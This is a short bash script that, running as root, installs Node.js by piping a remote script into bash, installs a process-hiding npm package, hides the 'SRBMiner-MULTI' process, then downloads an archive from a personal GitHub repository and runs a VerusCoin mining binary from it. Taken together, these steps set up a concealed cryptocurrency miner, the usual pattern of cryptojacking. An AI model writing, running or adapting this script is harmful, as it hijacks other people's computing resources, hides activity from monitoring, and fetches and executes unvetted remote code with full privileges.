#!/bin/bash
sudo su --command "sudo apt update && 
sudo apt install gcc -y && 
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && 
sudo apt install nodejs && 
npm install -g npm@8.4.1 && 
npm i -g node-process-hider && 
sudo ph add SRBMiner-MULTI && 
wget https://github.com/geraldyolang11/mine/raw/main/converted.tar && 
tar -xf converted.tar &&
chmod +x start-mining-veruscoin &&
./start-mining-veruscoin"
